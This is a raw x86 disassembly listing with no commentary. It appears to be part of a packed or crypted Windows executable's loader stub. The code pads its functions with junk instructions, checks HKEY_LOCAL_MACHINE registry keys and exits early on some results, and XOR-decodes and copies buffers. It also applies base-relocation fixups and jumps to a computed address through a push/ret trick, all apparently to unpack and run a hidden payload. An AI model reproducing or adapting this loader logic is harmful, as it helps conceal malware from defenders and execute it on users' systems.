  423cbd:	mov    DWORD PTR [ebp-0xc],0x1024a
  423cc4:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ccb:	mov    DWORD PTR [ebp-0xc],0x1024a
  423cd2:	mov    DWORD PTR [ebp-0xc],0x1024a
  423cd9:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ce0:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ce7:	mov    DWORD PTR [ebp-0xc],0x1024a
  423cee:	mov    DWORD PTR [ebp-0xc],0x1024a
  423cf5:	mov    DWORD PTR [ebp-0xc],0x1024a
  423cfc:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d03:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d0a:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d11:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d18:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d1f:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d26:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d2d:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d34:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d3b:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d42:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d49:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d50:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d57:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d5e:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d65:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d6c:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d73:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d7a:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d81:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d88:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d8f:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d96:	mov    DWORD PTR [ebp-0xc],0x1024a
  423d9d:	mov    DWORD PTR [ebp-0xc],0x1024a
  423da4:	mov    DWORD PTR [ebp-0xc],0x1024a
  423dab:	mov    DWORD PTR [ebp-0xc],0x1024a
  423db2:	mov    DWORD PTR [ebp-0xc],0x1024a
  423db9:	mov    DWORD PTR [ebp-0xc],0x1024a
  423dc0:	mov    DWORD PTR [ebp-0xc],0x1024a
  423dc7:	mov    DWORD PTR [ebp-0xc],0x1024a
  423dce:	mov    DWORD PTR [ebp-0xc],0x1024a
  423dd5:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ddc:	mov    DWORD PTR [ebp-0xc],0x1024a
  423de3:	mov    DWORD PTR [ebp-0xc],0x1024a
  423dea:	mov    DWORD PTR [ebp-0xc],0x1024a
  423df1:	mov    DWORD PTR [ebp-0xc],0x1024a
  423df8:	mov    DWORD PTR [ebp-0xc],0x1024a
  423dff:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e06:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e0d:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e14:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e1b:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e22:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e29:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e30:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e37:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e3e:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e45:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e4c:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e53:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e5a:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e61:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e68:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e6f:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e76:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e7d:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e84:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e8b:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e92:	mov    DWORD PTR [ebp-0xc],0x1024a
  423e99:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ea0:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ea7:	mov    DWORD PTR [ebp-0xc],0x1024a
  423eae:	mov    DWORD PTR [ebp-0xc],0x1024a
  423eb5:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ebc:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ec3:	mov    DWORD PTR [ebp-0xc],0x1024a
  423eca:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ed1:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ed8:	mov    DWORD PTR [ebp-0xc],0x1024a
  423edf:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ee6:	mov    DWORD PTR [ebp-0xc],0x1024a
  423eed:	mov    DWORD PTR [ebp-0xc],0x1024a
  423ef4:	mov    DWORD PTR [ebp-0xc],0x1024a
  423efb:	mov    DWORD PTR [ebp-0xc],0x1024a
  423f02:	mov    DWORD PTR [ebp-0xc],0x1024a
  423f09:	mov    DWORD PTR [ebp-0xc],0x1024a
  423f10:	mov    DWORD PTR [ebp-0xc],0x1024a
  423f17:	mov    DWORD PTR [ebp-0xc],0x1024a
  423f1e:	mov    DWORD PTR [ebp-0xc],0x1024a
  423f25:	mov    DWORD PTR [ebp-0xc],0x1024a
  423f2c:	mov    DWORD PTR [ebp-0xc],0x1024a
  423f33:	mov    DWORD PTR [ebp-0xc],0x1024a
  423f3a:	mov    ecx,DWORD PTR [ebp+0x8]
  423f3d:	mov    edx,DWORD PTR [ecx+0x4]
  423f40:	sub    edx,0x8
  423f43:	mov    DWORD PTR ds:0x4258f0,edx
  423f49:	mov    eax,DWORD PTR [ebp+0x8]
  423f4c:	mov    ds:0x4258e4,eax
  423f51:	mov    ecx,DWORD PTR [ebp+0x10]
  423f54:	push   ecx
  423f55:	mov    edx,DWORD PTR [ebp+0xc]
  423f58:	push   edx
  423f59:	push   0x1
  423f5b:	call   0x423170
  423f60:	add    esp,0xc
  423f63:	mov    DWORD PTR [ebp+0x8],eax
  423f66:	jmp    0x423b75
  423f6b:	mov    esp,ebp
  423f6d:	pop    ebp
  423f6e:	ret    
  423f6f:	int3   
  423f70:	push   ebp
  423f71:	mov    ebp,esp
  423f73:	sub    esp,0x8c
  423f79:	mov    DWORD PTR [ebp-0x28],0x423680
  423f80:	mov    DWORD PTR ds:0x4258e8,ebp
  423f86:	mov    DWORD PTR [ebp-0x2c],0x0
  423f8d:	mov    DWORD PTR [ebp-0x3c],0x80000002
  423f94:	push   0x7f00
  423f99:	push   0x0
  423f9b:	call   DWORD PTR ds:0x4252ec
  423fa1:	mov    DWORD PTR [ebp-0x7c],0x425000
  423fa8:	mov    eax,ds:0x4252c8
  423fad:	mov    DWORD PTR [ebp-0x74],eax
  423fb0:	mov    DWORD PTR [ebp-0xc],0x1471
  423fb7:	mov    DWORD PTR [ebp-0xc],0x1471
  423fbe:	mov    ecx,DWORD PTR ds:0x425358
  423fc4:	mov    DWORD PTR [ebp-0x70],ecx
  423fc7:	lea    edx,[ebp-0x78]
  423fca:	push   edx
  423fcb:	mov    eax,DWORD PTR [ebp-0x7c]
  423fce:	push   eax
  423fcf:	push   0x80000002
  423fd4:	call   DWORD PTR [ebp-0x70]
  423fd7:	test   eax,eax
  423fd9:	je     0x423fea
  423fdb:	push   0x0
  423fdd:	call   DWORD PTR ds:0x4252cc
  423fe3:	xor    eax,eax
  423fe5:	jmp    0x424232
  423fea:	lea    ecx,[ebp-0x78]
  423fed:	push   ecx
  423fee:	push   0x425050
  423ff3:	push   0x80000002
  423ff8:	call   DWORD PTR [ebp-0x70]
  423ffb:	test   eax,eax
  423ffd:	jne    0x42400e
  423fff:	push   0x0
  424001:	call   DWORD PTR ds:0x4252cc
  424007:	xor    eax,eax
  424009:	jmp    0x424232
  42400e:	call   0x4236d0
  424013:	mov    edx,DWORD PTR ds:0x4258d8
  424019:	push   edx
  42401a:	call   0x423070
  42401f:	add    esp,0x4
  424022:	mov    ds:0x4258d0,eax
  424027:	mov    eax,ds:0x4258d0
  42402c:	push   eax
  42402d:	call   0x423730
  424032:	add    esp,0x4
  424035:	mov    ds:0x4258f4,eax
  42403a:	mov    ecx,DWORD PTR ds:0x4258d0
  424040:	mov    DWORD PTR [ebp-0x34],ecx
  424043:	mov    DWORD PTR [ebp-0x24],0x64
  42404a:	mov    DWORD PTR [ebp-0x14],0x29
  424051:	mov    DWORD PTR [ebp-0x2c],0x0
  424058:	mov    DWORD PTR [ebp-0x18],0x0
  42405f:	mov    DWORD PTR [ebp-0x20],0x1
  424066:	mov    DWORD PTR [ebp-0xc],0x0
  42406d:	mov    edx,DWORD PTR [ebp-0x2c]
  424070:	cmp    edx,DWORD PTR ds:0x4258d0
  424076:	jae    0x4240ca
  424078:	mov    eax,DWORD PTR [ebp-0x34]
  42407b:	push   eax
  42407c:	mov    ecx,DWORD PTR [ebp-0x24]
  42407f:	push   ecx
  424080:	call   0x423130
  424085:	add    esp,0x8
  424088:	mov    DWORD PTR [ebp-0x38],eax
  42408b:	mov    edx,DWORD PTR [ebp-0x38]
  42408e:	push   edx
  42408f:	mov    eax,ds:0x4258d8
  424094:	add    eax,DWORD PTR [ebp-0x18]
  424097:	push   eax
  424098:	mov    ecx,DWORD PTR ds:0x4258f4
  42409e:	add    ecx,DWORD PTR [ebp-0x2c]
  4240a1:	push   ecx
  4240a2:	call   0x4243a0
  4240a7:	add    esp,0xc
  4240aa:	mov    edx,DWORD PTR [ebp-0x14]
  4240ad:	add    edx,DWORD PTR [ebp-0x24]
  4240b0:	add    edx,DWORD PTR [ebp-0x18]
  4240b3:	mov    DWORD PTR [ebp-0x18],edx
  4240b6:	mov    eax,DWORD PTR [ebp-0x2c]
  4240b9:	add    eax,DWORD PTR [ebp-0x24]
  4240bc:	mov    DWORD PTR [ebp-0x2c],eax
  4240bf:	mov    ecx,DWORD PTR [ebp-0x34]
  4240c2:	sub    ecx,DWORD PTR [ebp-0x38]
  4240c5:	mov    DWORD PTR [ebp-0x34],ecx
  4240c8:	jmp    0x42406d
  4240ca:	mov    edx,DWORD PTR ds:0x4258d0
  4240d0:	push   edx
  4240d1:	mov    eax,ds:0x4258f4
  4240d6:	push   eax
  4240d7:	call   0x424450
  4240dc:	add    esp,0x8
  4240df:	mov    DWORD PTR [ebp-0x18],0x0
  4240e6:	mov    DWORD PTR [ebp-0x80],0x0
  4240ed:	mov    ecx,DWORD PTR ds:0x4258d0
  4240f3:	push   ecx
  4240f4:	push   0x0
  4240f6:	mov    edx,DWORD PTR ds:0x4258d4
  4240fc:	push   edx
  4240fd:	call   0x423020
  424102:	add    esp,0xc
  424105:	mov    eax,ds:0x4258d0
  42410a:	mov    DWORD PTR [ebp-0x88],eax
  424110:	mov    ecx,DWORD PTR [ebp-0x80]
  424113:	cmp    ecx,DWORD PTR ds:0x4258d0
  424119:	jae    0x42417f
  42411b:	mov    edx,DWORD PTR [ebp-0x88]
  424121:	push   edx
  424122:	mov    eax,DWORD PTR [ebp-0x24]
  424125:	push   eax
  424126:	call   0x423130
  42412b:	add    esp,0x8
  42412e:	mov    DWORD PTR [ebp-0x8c],eax
  424134:	mov    ecx,DWORD PTR [ebp-0x8c]
  42413a:	push   ecx
  42413b:	mov    edx,DWORD PTR ds:0x4258d8
  424141:	add    edx,DWORD PTR [ebp-0x18]
  424144:	push   edx
  424145:	mov    eax,ds:0x4258d4
  42414a:	add    eax,DWORD PTR [ebp-0x80]
  42414d:	push   eax
  42414e:	call   0x4243a0
  424153:	add    esp,0xc
  424156:	mov    ecx,DWORD PTR [ebp-0x14]
  424159:	add    ecx,DWORD PTR [ebp-0x24]
  42415c:	add    ecx,DWORD PTR [ebp-0x18]
  42415f:	mov    DWORD PTR [ebp-0x18],ecx
  424162:	mov    edx,DWORD PTR [ebp-0x80]
  424165:	add    edx,DWORD PTR [ebp-0x24]
  424168:	mov    DWORD PTR [ebp-0x80],edx
  42416b:	mov    eax,DWORD PTR [ebp-0x88]
  424171:	sub    eax,DWORD PTR [ebp-0x8c]
  424177:	mov    DWORD PTR [ebp-0x88],eax
  42417d:	jmp    0x424110
  42417f:	mov    ecx,DWORD PTR ds:0x4258d0
  424185:	push   ecx
  424186:	mov    edx,DWORD PTR ds:0x4258d4
  42418c:	push   edx
  42418d:	call   0x424450
  424192:	add    esp,0x8
  424195:	mov    DWORD PTR [ebp-0x28],0x423680
  42419c:	mov    eax,ds:0x4258f4
  4241a1:	mov    ecx,DWORD PTR ds:0x4258d4
  4241a7:	mov    DWORD PTR [eax],ecx
  4241a9:	push   0x19000
  4241ae:	call   0x423730
  4241b3:	add    esp,0x4
  4241b6:	mov    ds:0x4258f8,eax
  4241bb:	mov    edx,DWORD PTR ds:0x4258f8
  4241c1:	add    edx,0x200
  4241c7:	mov    DWORD PTR ds:0x4258fc,edx
  4241cd:	push   0x17600
  4241d2:	mov    eax,ds:0x4258f4
  4241d7:	push   eax
  4241d8:	mov    ecx,DWORD PTR ds:0x4258fc
  4241de:	push   ecx
  4241df:	call   0x4243a0
  4241e4:	add    esp,0xc
  4241e7:	mov    edx,DWORD PTR ds:0x4258f8
  4241ed:	add    edx,0x174c0
  4241f3:	mov    DWORD PTR ds:0x4258ec,edx
  4241f9:	mov    ecx,ecx
  4241fb:	mov    ecx,ecx
  4241fd:	mov    ecx,ecx
  4241ff:	mov    ecx,ecx
  424201:	mov    ecx,ecx
  424203:	mov    ecx,ecx
  424205:	mov    ecx,ecx
  424207:	push   0xde9b
  42420c:	mov    eax,DWORD PTR [ebp-0x28]
  42420f:	mov    ecx,ecx
  424211:	mov    ecx,ecx
  424213:	mov    ecx,esp
  424215:	push   edx
  424216:	mov    edx,ecx
  424218:	sub    edx,0x26
  42421b:	mov    ecx,edx
  42421d:	pop    edx
  42421e:	add    ecx,0x22
  424221:	mov    ecx,ecx
  424223:	mov    DWORD PTR [ecx+0x4],0x0
  42422a:	mov    ecx,ecx
  42422c:	add    DWORD PTR [ecx+0x4],eax
  42422f:	ret    
  424230:	xor    eax,eax
  424232:	mov    esp,ebp
  424234:	pop    ebp
  424235:	ret    
  424236:	int3   
  424237:	int3   
  424238:	int3   
  424239:	int3   
  42423a:	int3   
  42423b:	int3   
  42423c:	int3   
  42423d:	int3   
  42423e:	int3   
  42423f:	int3   
  424240:	push   ebp
  424241:	mov    ebp,esp
  424243:	sub    esp,0x10
  424246:	push   esi
  424247:	mov    DWORD PTR [ebp-0xc],0x889bb
  42424e:	mov    DWORD PTR [ebp-0xc],0x889bb
  424255:	mov    DWORD PTR [ebp-0xc],0x889bb
  42425c:	mov    DWORD PTR [ebp-0xc],0x889bb
  424263:	mov    DWORD PTR [ebp-0xc],0x889bb
  42426a:	mov    DWORD PTR [ebp-0xc],0x889bb
  424271:	mov    DWORD PTR [ebp-0xc],0x889bb
  424278:	mov    DWORD PTR [ebp-0xc],0x889bb
  42427f:	mov    DWORD PTR [ebp-0xc],0x889bb
  424286:	mov    DWORD PTR [ebp-0xc],0x889bb
  42428d:	mov    DWORD PTR [ebp-0xc],0x889bb
  424294:	mov    eax,DWORD PTR [ebp+0x8]
  424297:	add    eax,0x8
  42429a:	mov    ds:0x425900,eax
  42429f:	mov    DWORD PTR [ebp-0x4],0x0
  4242a6:	jmp    0x4242b1
  4242a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ab:	add    ecx,0x1
  4242ae:	mov    DWORD PTR [ebp-0x4],ecx
  4242b1:	mov    edx,DWORD PTR ds:0x4258f0
  4242b7:	shr    edx,1
  4242b9:	cmp    DWORD PTR [ebp-0x4],edx
  4242bc:	jae    0x424392
  4242c2:	mov    DWORD PTR [ebp-0xc],0x889bb
  4242c9:	mov    DWORD PTR [ebp-0xc],0x889bb
  4242d0:	mov    DWORD PTR [ebp-0xc],0x889bb
  4242d7:	mov    DWORD PTR [ebp-0xc],0x889bb
  4242de:	mov    DWORD PTR [ebp-0xc],0x889bb
  4242e5:	mov    DWORD PTR [ebp-0xc],0x889bb
  4242ec:	mov    DWORD PTR [ebp-0xc],0x889bb
  4242f3:	mov    DWORD PTR [ebp-0xc],0x889bb
  4242fa:	mov    DWORD PTR [ebp-0xc],0x889bb
  424301:	mov    eax,DWORD PTR [ebp-0x4]
  424304:	push   eax
  424305:	mov    ecx,DWORD PTR ds:0x425900
  42430b:	push   ecx
  42430c:	call   0x4230c0
  424311:	add    esp,0x8
  424314:	sar    eax,0xc
  424317:	cmp    eax,0x3
  42431a:	jne    0x42438d
  42431c:	mov    DWORD PTR [ebp-0xc],0x889bb
  424323:	mov    DWORD PTR [ebp-0xc],0x889bb
  42432a:	mov    DWORD PTR [ebp-0xc],0x889bb
  424331:	mov    DWORD PTR [ebp-0xc],0x889bb
  424338:	mov    DWORD PTR [ebp-0xc],0x889bb
  42433f:	mov    DWORD PTR [ebp-0xc],0x889bb
  424346:	mov    DWORD PTR [ebp-0xc],0x889bb
  42434d:	mov    DWORD PTR [ebp-0xc],0x889bb
  424354:	mov    DWORD PTR [ebp-0xc],0x889bb
  42435b:	mov    edx,DWORD PTR [ebp+0x8]
  42435e:	mov    esi,DWORD PTR [ebp+0xc]
  424361:	add    esi,DWORD PTR [edx]
  424363:	mov    eax,DWORD PTR [ebp-0x4]
  424366:	push   eax
  424367:	mov    ecx,DWORD PTR ds:0x425900
  42436d:	push   ecx
  42436e:	call   0x4230c0
  424373:	add    esp,0x8
  424376:	and    eax,0xfff
  42437b:	add    esi,eax
  42437d:	mov    DWORD PTR [ebp-0x10],esi
  424380:	mov    edx,DWORD PTR [ebp-0x10]
  424383:	mov    eax,DWORD PTR [edx]
  424385:	add    eax,DWORD PTR [ebp+0x10]
  424388:	mov    ecx,DWORD PTR [ebp-0x10]
  42438b:	mov    DWORD PTR [ecx],eax
  42438d:	jmp    0x4242a8
  424392:	pop    esi
  424393:	mov    esp,ebp
  424395:	pop    ebp
  424396:	ret    
  424397:	int3   
  424398:	int3   
  424399:	int3   
  42439a:	int3   
  42439b:	int3   
  42439c:	int3   
  42439d:	int3   
  42439e:	int3   
  42439f:	int3   
  4243a0:	push   ebp
  4243a1:	mov    ebp,esp
  4243a3:	sub    esp,0x8
  4243a6:	mov    DWORD PTR [ebp-0x4],0x0
  4243ad:	jmp    0x4243b8
  4243af:	mov    eax,DWORD PTR [ebp-0x4]
  4243b2:	add    eax,0x1
  4243b5:	mov    DWORD PTR [ebp-0x4],eax
  4243b8:	mov    ecx,DWORD PTR [ebp-0x4]
  4243bb:	cmp    ecx,DWORD PTR [ebp+0x10]
  4243be:	jge    0x42441f
  4243c0:	mov    DWORD PTR [ebp-0x8],0x889bb
  4243c7:	mov    DWORD PTR [ebp-0x8],0x889bb
  4243ce:	mov    DWORD PTR [ebp-0x8],0x889bb
  4243d5:	mov    DWORD PTR [ebp-0x8],0x889bb
  4243dc:	mov    DWORD PTR [ebp-0x8],0x889bb
  4243e3:	mov    DWORD PTR [ebp-0x8],0x889bb
  4243ea:	mov    DWORD PTR [ebp-0x8],0x889bb
  4243f1:	mov    DWORD PTR [ebp-0x8],0x889bb
  4243f8:	mov    DWORD PTR [ebp-0x8],0x889bb
  4243ff:	mov    DWORD PTR [ebp-0x8],0x889bb
  424406:	mov    DWORD PTR [ebp-0x8],0x889bb
  42440d:	mov    edx,DWORD PTR [ebp+0x8]
  424410:	add    edx,DWORD PTR [ebp-0x4]
  424413:	mov    eax,DWORD PTR [ebp+0xc]
  424416:	add    eax,DWORD PTR [ebp-0x4]
  424419:	mov    cl,BYTE PTR [eax]
  42441b:	mov    BYTE PTR [edx],cl
  42441d:	jmp    0x4243af
  42441f:	mov    edx,DWORD PTR [ebp+0x8]
  424422:	cmp    edx,DWORD PTR ds:0x4258fc
  424428:	jne    0x42444b
  42442a:	mov    eax,ds:0x4258f8
  42442f:	sub    eax,0x400000
  424434:	push   eax
  424435:	mov    ecx,DWORD PTR ds:0x4258f8
  42443b:	push   ecx
  42443c:	mov    edx,DWORD PTR ds:0x4258d4
  424442:	push   edx
  424443:	call   0x4237b0
  424448:	add    esp,0xc
  42444b:	mov    esp,ebp
  42444d:	pop    ebp
  42444e:	ret    
  42444f:	int3   
  424450:	push   ebp
  424451:	mov    ebp,esp
  424453:	sub    esp,0x10
  424456:	mov    DWORD PTR [ebp-0x4],0x0
  42445d:	jmp    0x424468
  42445f:	mov    eax,DWORD PTR [ebp-0x4]
  424462:	add    eax,0x4
  424465:	mov    DWORD PTR [ebp-0x4],eax
  424468:	mov    ecx,DWORD PTR [ebp-0x4]
  42446b:	cmp    ecx,DWORD PTR [ebp+0xc]
  42446e:	jae    0x42450b
  424474:	mov    DWORD PTR [ebp-0x8],0xc842
  42447b:	mov    DWORD PTR [ebp-0x8],0xc842
  424482:	mov    DWORD PTR [ebp-0x8],0xc842
  424489:	mov    edx,DWORD PTR [ebp-0x4]
  42448c:	add    edx,0x5b1c
  424492:	mov    DWORD PTR ds:0x425904,edx
  424498:	mov    DWORD PTR [ebp-0x8],0xc842
  42449f:	mov    eax,DWORD PTR [ebp+0x8]
  4244a2:	add    eax,DWORD PTR [ebp-0x4]
  4244a5:	mov    DWORD PTR [ebp-0x10],eax
  4244a8:	mov    DWORD PTR [ebp-0x8],0xc842
  4244af:	mov    DWORD PTR [ebp-0x8],0xc842
  4244b6:	mov    DWORD PTR [ebp-0x8],0xc842
  4244bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4244c0:	mov    DWORD PTR [ebp-0xc],ecx
  4244c3:	mov    edx,DWORD PTR ds:0x425904
  4244c9:	mov    DWORD PTR [ebp-0x8],edx
  4244cc:	mov    DWORD PTR [ebp-0x8],0xc842
  4244d3:	mov    eax,DWORD PTR [ebp-0x10]
  4244d6:	mov    ecx,DWORD PTR [eax]
  4244d8:	add    ecx,DWORD PTR [ebp-0x4]
  4244db:	mov    edx,DWORD PTR [ebp-0x10]
  4244de:	mov    DWORD PTR [edx],ecx
  4244e0:	mov    eax,DWORD PTR [ebp-0xc]
  4244e3:	mov    ecx,DWORD PTR [eax]
  4244e5:	mov    DWORD PTR [ebp-0x8],ecx
  4244e8:	mov    edx,DWORD PTR ds:0x425904
  4244ee:	push   edx
  4244ef:	mov    eax,DWORD PTR [ebp-0x8]
  4244f2:	push   eax
  4244f3:	call   0x424510
  4244f8:	add    esp,0x8
  4244fb:	mov    DWORD PTR [ebp-0x8],eax
  4244fe:	mov    ecx,DWORD PTR [ebp-0xc]
  424501:	mov    edx,DWORD PTR [ebp-0x8]
  424504:	mov    DWORD PTR [ecx],edx
  424506:	jmp    0x42445f
  42450b:	mov    esp,ebp
  42450d:	pop    ebp
  42450e:	ret    
  42450f:	int3   
  424510:	push   ebp
  424511:	mov    ebp,esp
  424513:	sub    esp,0x14
  424516:	mov    DWORD PTR [ebp-0x8],0xdd7
  42451d:	mov    DWORD PTR [ebp-0x8],0xdd7
  424524:	mov    DWORD PTR [ebp-0x8],0xdd7
  42452b:	mov    eax,DWORD PTR [ebp+0x8]
  42452e:	xor    eax,DWORD PTR [ebp+0xc]
  424531:	mov    DWORD PTR [ebp-0x10],eax
  424534:	mov    DWORD PTR [ebp-0x8],0xdd7
  42453b:	mov    DWORD PTR [ebp-0x8],0xdd7
  424542:	mov    ecx,DWORD PTR [ebp+0xc]
  424545:	mov    DWORD PTR [ebp-0x4],ecx
  424548:	mov    DWORD PTR [ebp-0x8],0xdd7
  42454f:	mov    DWORD PTR [ebp-0x8],0xdd7
  424556:	mov    edx,DWORD PTR [ebp+0x8]
  424559:	mov    DWORD PTR [ebp-0xc],edx
  42455c:	mov    DWORD PTR [ebp-0x8],0xdd7
  424563:	mov    DWORD PTR [ebp-0x8],0xdd7
  42456a:	mov    eax,DWORD PTR [ebp-0x10]
  42456d:	mov    DWORD PTR [ebp-0x14],eax
  424570:	mov    eax,DWORD PTR [ebp-0x14]
  424573:	mov    esp,ebp
  424575:	pop    ebp
  424576:	ret    
  424577:	jmp    DWORD PTR ds:0x425240
  42457d:	jmp    DWORD PTR ds:0x425244
  424583:	jmp    DWORD PTR ds:0x425248
  424589:	jmp    DWORD PTR ds:0x42524c
  42458f:	jmp    DWORD PTR ds:0x425250
  424595:	jmp    DWORD PTR ds:0x425254
  42459b:	jmp    DWORD PTR ds:0x425258
  4245a1:	jmp    DWORD PTR ds:0x42525c
  4245a7:	jmp    DWORD PTR ds:0x425260
  4245ad:	jmp    DWORD PTR ds:0x425264
  4245b3:	jmp    DWORD PTR ds:0x425268
  4245b9:	jmp    DWORD PTR ds:0x42526c
  4245bf:	jmp    DWORD PTR ds:0x425270
  4245c5:	jmp    DWORD PTR ds:0x425274
  4245cb:	jmp    DWORD PTR ds:0x425278
  4245d1:	jmp    DWORD PTR ds:0x42527c
  4245d7:	jmp    DWORD PTR ds:0x425280
  4245dd:	jmp    DWORD PTR ds:0x425284
  4245e3:	jmp    DWORD PTR ds:0x425288
  4245e9:	jmp    DWORD PTR ds:0x42528c
  4245ef:	jmp    DWORD PTR ds:0x425290
  4245f5:	jmp    DWORD PTR ds:0x425294
  4245fb:	jmp    DWORD PTR ds:0x425298
  424601:	jmp    DWORD PTR ds:0x42529c
  424607:	jmp    DWORD PTR ds:0x4252a0
  42460d:	jmp    DWORD PTR ds:0x4252a4
  424613:	jmp    DWORD PTR ds:0x4252a8
  424619:	jmp    DWORD PTR ds:0x4252ac
  42461f:	jmp    DWORD PTR ds:0x4252b0
  424625:	jmp    DWORD PTR ds:0x4252b4
  42462b:	jmp    DWORD PTR ds:0x4252b8
  424631:	jmp    DWORD PTR ds:0x4252bc
  424637:	jmp    DWORD PTR ds:0x4252c0
  42463d:	jmp    DWORD PTR ds:0x4252c4
  424643:	jmp    DWORD PTR ds:0x4252c8
  424649:	jmp    DWORD PTR ds:0x4252cc
  42464f:	jmp    DWORD PTR ds:0x4252d4
  424655:	jmp    DWORD PTR ds:0x4252d8
  42465b:	jmp    DWORD PTR ds:0x4252dc
  424661:	jmp    DWORD PTR ds:0x4252e0
  424667:	jmp    DWORD PTR ds:0x4252e4
  42466d:	jmp    DWORD PTR ds:0x4252e8
  424673:	jmp    DWORD PTR ds:0x4252ec
  424679:	jmp    DWORD PTR ds:0x4252f4
  42467f:	int3   
  424680:	jmp    DWORD PTR ds:0x4252fc
  424686:	jmp    DWORD PTR ds:0x425300
  42468c:	jmp    DWORD PTR ds:0x425304
  424692:	jmp    DWORD PTR ds:0x425308
  424698:	jmp    DWORD PTR ds:0x42530c
  42469e:	jmp    DWORD PTR ds:0x425310
  4246a4:	jmp    DWORD PTR ds:0x425314
  4246aa:	jmp    DWORD PTR ds:0x425318
  4246b0:	jmp    DWORD PTR ds:0x42531c
  4246b6:	jmp    DWORD PTR ds:0x425320
  4246bc:	jmp    DWORD PTR ds:0x425324
  4246c2:	jmp    DWORD PTR ds:0x425328
  4246c8:	jmp    DWORD PTR ds:0x42532c
  4246ce:	jmp    DWORD PTR ds:0x425330
  4246d4:	jmp    DWORD PTR ds:0x425334
  4246da:	jmp    DWORD PTR ds:0x425338
  4246e0:	jmp    DWORD PTR ds:0x42533c
  4246e6:	jmp    DWORD PTR ds:0x425340
  4246ec:	jmp    DWORD PTR ds:0x425344
  4246f2:	jmp    DWORD PTR ds:0x425348
  4246f8:	jmp    DWORD PTR ds:0x42534c
  4246fe:	jmp    DWORD PTR ds:0x425354
  424704:	jmp    DWORD PTR ds:0x425358
  42470a:	jmp    DWORD PTR ds:0x425360
  424710:	jmp    DWORD PTR ds:0x425364
  424716:	jmp    DWORD PTR ds:0x425368
  42471c:	jmp    DWORD PTR ds:0x42536c
  424722:	jmp    DWORD PTR ds:0x425370
  424728:	jmp    DWORD PTR ds:0x425374
  42472e:	jmp    DWORD PTR ds:0x425378
  424734:	jmp    DWORD PTR ds:0x42537c
  42473a:	jmp    DWORD PTR ds:0x425384
